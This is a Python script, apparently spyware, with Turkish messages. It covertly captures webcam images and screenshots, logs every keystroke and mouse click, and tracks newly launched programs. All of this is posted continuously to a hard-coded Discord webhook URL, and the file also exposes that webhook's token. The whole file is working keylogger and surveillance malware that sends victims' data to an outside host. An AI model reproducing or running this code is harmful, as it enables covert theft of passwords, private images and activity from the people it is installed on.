import os


import cv2
import numpy as np
import pyautogui
import time
import requests
import threading

from pynput import keyboard, mouse
import psutil

webhook_url = "https://discord.com/api/webhooks/1261059484206497872/66x8vCxpiHGOuc-DFaPrCgQhDX-dt1kOvxA-guxw-YNLaMAeuEkVJEiqXdVsAuaAtw9l"

def send_image(image, endpoint, filename):
    cv2.imwrite(filename, image)
    with open(filename, 'rb') as f:
        response = requests.post(endpoint, files={'file': f})
    os.remove(filename)
    return response

def capture_camera():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("kamera yokla")
        return

    while True:
        ret, frame = cap.read()
        if not ret:
            print("çekemedim")
            break

        filename = f"camera_capture_{int(time.time())}.jpg"
        send_image(frame, webhook_url, filename)
        time.sleep(10)

    cap.release()

def capture_screenshot():
    while True:
        screenshot = pyautogui.screenshot()
        screenshot = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        filename = f"screenshot_{int(time.time())}.jpg"
        send_image(screenshot, webhook_url, filename)
        time.sleep(20)

def on_press(key):
    try:
        requests.post(webhook_url, json={"content": f"TUŞA BASTI: {key.char}"})
    except AttributeError:
        requests.post(webhook_url, json={"content": f"BU TUŞA BASTI: {key}"})

def on_click(x, y, button, pressed):
    if pressed:
        requests.post(webhook_url, json={"content": f"MOUSE TIKLADI: ({x}, {y}) - {button} tuşu ile"})

def start_keyboard_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def start_mouse_listener():
    with mouse.Listener(on_click=on_click) as listener:
        listener.join()

def monitor_processes():
    existing_processes = set(p.info['name'] for p in psutil.process_iter(['name']))
    while True:
        current_processes = set(p.info['name'] for p in psutil.process_iter(['name']))
        new_processes = current_processes - existing_processes
        for process in new_processes:
            requests.post(webhook_url, json={"content": f"YENİ PROGRAM AÇILDI: {process}"})
        existing_processes = current_processes
        time.sleep(5)

camera_thread = threading.Thread(target=capture_camera)
screenshot_thread = threading.Thread(target=capture_screenshot)
keyboard_thread = threading.Thread(target=start_keyboard_listener)
mouse_thread = threading.Thread(target=start_mouse_listener)
process_thread = threading.Thread(target=monitor_processes)

camera_thread.start()
screenshot_thread.start()
keyboard_thread.start()
mouse_thread.start()
process_thread.start()

camera_thread.join()
screenshot_thread.join()
keyboard_thread.join()
mouse_thread.join()
process_thread.join()
